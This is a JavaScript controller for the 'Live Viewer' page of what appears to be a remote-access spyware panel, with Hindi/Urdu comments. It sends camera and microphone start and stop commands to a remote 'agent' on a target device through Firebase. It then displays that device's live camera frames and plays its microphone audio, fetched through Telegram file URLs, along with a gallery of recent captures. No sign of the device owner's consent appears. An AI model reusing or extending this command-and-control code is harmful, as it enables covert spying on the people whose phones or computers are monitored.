// ============================================
// LIVE VIEWER CONTROLLER
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('[Live] Loaded');

    if (!AUTH.isLoggedIn()) {
        window.location.href = 'index.html';
        return;
    }

    const params = new URLSearchParams(window.location.search);
    let deviceKey = params.get('device') || localStorage.getItem('selectedDevice');

    if (!deviceKey) {
        alert('Koi device select nahi kiya');
        window.location.href = 'dashboard.html';
        return;
    }

    // State
    let camActive = false;
    let micActive = false;
    let camInterval = null;
    let micInterval = null;
    let lastFrameFileId = null;
    let lastAudioFileId = null;

    // Audio queue for live playback
    const audioQueue = [];
    let isPlayingAudio = false;

    // Elements
    const camImg = document.getElementById('liveCamImg');
    const camPlaceholder = document.getElementById('camPlaceholder');
    const camLastUpdate = document.getElementById('camLastUpdate');
    const micLastUpdate = document.getElementById('micLastUpdate');
    const audioWave = document.getElementById('audioWave');
    const liveAudioStatus = document.getElementById('liveAudioStatus');
    const liveStatusBadge = document.getElementById('liveStatus');
    const recentFrames = document.getElementById('recentFrames');
    const toast = document.getElementById('toast');

    // ========== HEADER ==========
    document.getElementById('backBtn').addEventListener('click', () => {
        window.location.href = 'dashboard.html';
    });

    // ========== FIREBASE LISTENERS — Live Frame ==========
    window.db.ref(`devices/${deviceKey}/liveFrame`).on('value', (snap) => {
        const data = snap.val();
        if (!data) return;

        camLastUpdate.textContent = timeAgo(data.time);

        // Note: Firebase DB mein fileId direct save nahi hota currently.
        // Isliye hum live folder se latest file check karte hain.
        // Simplification: Live stream ke liye Firebase DB ko update karna hoga.
    });

    // Live frame listener — agent live folder mein push karta hai
    window.db.ref(`devices/${deviceKey}/photos`).limitToLast(1).on('child_added', (snap) => {
        const data = snap.val();
        if (data && data.fileId) {
            // Latest photo as live frame (agar stream active hai)
            if (camActive) {
                loadLiveFrame(data.fileId);
            }
        }
    });

    // Live audio listener
    window.db.ref(`devices/${deviceKey}/liveAudio`).on('value', (snap) => {
        const data = snap.val();
        if (!data) return;

        micLastUpdate.textContent = timeAgo(data.time);

        if (micActive && data.fileId) {
            queueAudio(data.fileId);
        }
    });

    // ========== LOAD LIVE FRAME ==========
    async function loadLiveFrame(fileId) {
        if (!camActive) return;
        if (fileId === lastFrameFileId) return;
        lastFrameFileId = fileId;

        try {
            const url = await Telegram.getFileUrl(fileId);
            if (!url) return;

            // Cache bust
            camImg.src = `${url}&t=${Date.now()}`;
            camImg.classList.remove('hidden');
            camPlaceholder.classList.add('hidden');
        } catch (e) {
            console.warn('[Live] Frame load failed', e);
        }
    }

    // ========== AUDIO QUEUE ==========
    function queueAudio(fileId) {
        if (fileId === lastAudioFileId) return;
        lastAudioFileId = fileId;
        audioQueue.push(fileId);
        processAudioQueue();
    }

    async function processAudioQueue() {
        if (isPlayingAudio || audioQueue.length === 0) return;
        isPlayingAudio = true;

        const fileId = audioQueue.shift();

        try {
            const url = await Telegram.getFileUrl(fileId);
            if (!url) {
                isPlayingAudio = false;
                return;
            }

            const audio = new Audio(url);
            audio.volume = 0.9;

            audio.onended = () => {
                isPlayingAudio = false;
                if (audioQueue.length > 0) {
                    processAudioQueue();
                } else {
                    updateAudioWave(false);
                }
            };

            audio.onerror = () => {
                isPlayingAudio = false;
                if (audioQueue.length > 0) processAudioQueue();
            };

            updateAudioWave(true);
            await audio.play();

        } catch (e) {
            console.warn('[Live] Audio play failed', e);
            isPlayingAudio = false;
            if (audioQueue.length > 0) processAudioQueue();
        }
    }

    function updateAudioWave(active) {
        if (active) {
            audioWave.classList.add('active');
            liveAudioStatus.textContent = '🔊 Playing';
            liveAudioStatus.classList.add('active');
        } else {
            audioWave.classList.remove('active');
            liveAudioStatus.textContent = micActive ? '🎙️ Waiting for chunks...' : 'Idle';
            liveAudioStatus.classList.toggle('active', micActive);
        }
    }

    // ========== CAMERA CONTROLS ==========
    document.getElementById('startCamBtn').addEventListener('click', async () => {
        await sendCmd('CAM_LIVE');
        camActive = true;
        document.getElementById('startCamBtn').disabled = true;
        document.getElementById('stopCamBtn').disabled = false;
        updateLiveBadge();
        showToast('🎥 Camera stream start kiya', 'success');

        // Poll latest photos folder for new frames
        startFramePolling();
    });

    document.getElementById('stopCamBtn').addEventListener('click', async () => {
        await sendCmd('CAM_LIVE_STOP');
        camActive = false;
        stopFramePolling();
        document.getElementById('startCamBtn').disabled = false;
        document.getElementById('stopCamBtn').disabled = true;
        updateLiveBadge();

        camImg.classList.add('hidden');
        camPlaceholder.classList.remove('hidden');
        showToast('⏹ Camera stop kiya', 'success');
    });

    // ========== MIC CONTROLS ==========
    document.getElementById('startMicBtn').addEventListener('click', async () => {
        await sendCmd('MIC_LIVE');
        micActive = true;
        document.getElementById('startMicBtn').disabled = true;
        document.getElementById('stopMicBtn').disabled = false;
        updateAudioWave(false);
        updateLiveBadge();
        showToast('🎙️ Mic stream start kiya', 'success');
    });

    document.getElementById('stopMicBtn').addEventListener('click', async () => {
        await sendCmd('MIC_LIVE_STOP');
        micActive = false;
        audioQueue.length = 0;
        document.getElementById('startMicBtn').disabled = false;
        document.getElementById('stopMicBtn').disabled = true;
        updateAudioWave(false);
        updateLiveBadge();
        showToast('⏹ Mic stop kiya', 'success');
    });

    // ========== COMBINED ==========
    document.getElementById('startBothBtn').addEventListener('click', async () => {
        await sendCmd('CAM_LIVE');
        await sendCmd('MIC_LIVE');

        camActive = true;
        micActive = true;

        document.getElementById('startCamBtn').disabled = true;
        document.getElementById('stopCamBtn').disabled = false;
        document.getElementById('startMicBtn').disabled = true;
        document.getElementById('stopMicBtn').disabled = false;

        startFramePolling();
        updateAudioWave(false);
        updateLiveBadge();
        showToast('▶️ Camera + Mic start kiye', 'success');
    });

    document.getElementById('stopAllBtn').addEventListener('click', async () => {
        await sendCmd('LIVE_STOP_ALL');

        camActive = false;
        micActive = false;
        audioQueue.length = 0;
        stopFramePolling();

        document.getElementById('startCamBtn').disabled = false;
        document.getElementById('stopCamBtn').disabled = true;
        document.getElementById('startMicBtn').disabled = false;
        document.getElementById('stopMicBtn').disabled = true;

        camImg.classList.add('hidden');
        camPlaceholder.classList.remove('hidden');
        updateAudioWave(false);
        updateLiveBadge();
        showToast('⏹ Sab stop kiya', 'success');
    });

    function updateLiveBadge() {
        if (camActive || micActive) {
            const parts = [];
            if (camActive) parts.push('📹');
            if (micActive) parts.push('🎙️');
            liveStatusBadge.textContent = `🔴 LIVE ${parts.join(' ')}`;
            liveStatusBadge.classList.add('active');
        } else {
            liveStatusBadge.textContent = '⏸ Idle';
            liveStatusBadge.classList.remove('active');
        }
    }

    // ========== FRAME POLLING ==========
    // Agent jab live frame Telegram pe bhejta hai, humein direct pata nahi chalta
    // Toh hum latest photos folder ko monitor karte hain
    let framePollRef = null;

    function startFramePolling() {
        if (framePollRef) return;

        // Latest photo ka fileId track karo
        framePollRef = window.db.ref(`devices/${deviceKey}/photos`).limitToLast(1);

        framePollRef.on('child_added', async (snap) => {
            const data = snap.val();
            if (data && data.fileId && camActive) {
                loadLiveFrame(data.fileId);
            }
        });
    }

    function stopFramePolling() {
        if (framePollRef) {
            framePollRef.off('child_added');
            framePollRef = null;
        }
    }

    // ========== RECENT FRAMES ==========
    window.db.ref(`devices/${deviceKey}/photos`).limitToLast(9).on('value', (snap) => {
        const data = snap.val() || {};
        const items = Object.values(data)
            .filter(d => d.fileId)
            .sort((a, b) => (b.time || 0) - (a.time || 0));

        if (items.length === 0) {
            recentFrames.innerHTML = '<div class="gallery-empty">Koi frame nahi</div>';
            return;
        }

        recentFrames.innerHTML = items.map((item, i) => `
            <div class="recent-frame-item" data-file-id="${item.fileId}">
                <div class="media-item-loader"></div>
                <div class="recent-frame-item-time">${timeAgo(item.time)}</div>
            </div>
        `).join('');

        // Load thumbnails
        recentFrames.querySelectorAll('.recent-frame-item').forEach(async el => {
            const url = await Telegram.getFileUrl(el.dataset.fileId);
            if (url) {
                const loader = el.querySelector('.media-item-loader');
                if (loader) loader.remove();

                const img = document.createElement('img');
                img.src = url;
                img.style.cssText = 'width:100%;height:100%;object-fit:cover;';
                el.insertBefore(img, el.firstChild);
            }
        });
    });

    // ========== SEND COMMAND ==========
    async function sendCmd(cmd) {
        try {
            await window.db.ref('commands/' + deviceKey).set({
                cmd: cmd,
                status: 'pending',
                sentAt: Date.now()
            });
            return true;
        } catch (e) {
            showToast('Command fail', 'error');
            return false;
        }
    }

    // ========== HELPERS ==========
    function showToast(msg, type) {
        toast.textContent = msg;
        toast.className = 'toast ' + (type || 'info');
        toast.classList.remove('hidden');
        clearTimeout(window._toastTimeout);
        window._toastTimeout = setTimeout(() => toast.classList.add('hidden'), 2500);
    }

    function timeAgo(timestamp) {
        if (!timestamp) return '—';
        const diff = Date.now() - timestamp;
        if (diff < 60_000) return 'Just now';
        if (diff < 3_600_000) return `${Math.floor(diff / 60_000)}m ago`;
        if (diff < 86_400_000) return `${Math.floor(diff / 3_600_000)}h ago`;
        return `${Math.floor(diff / 86_400_000)}d ago`;
    }

    // Cleanup
    window.addEventListener('beforeunload', () => {
        stopFramePolling();
        audioQueue.length = 0;
    });
});
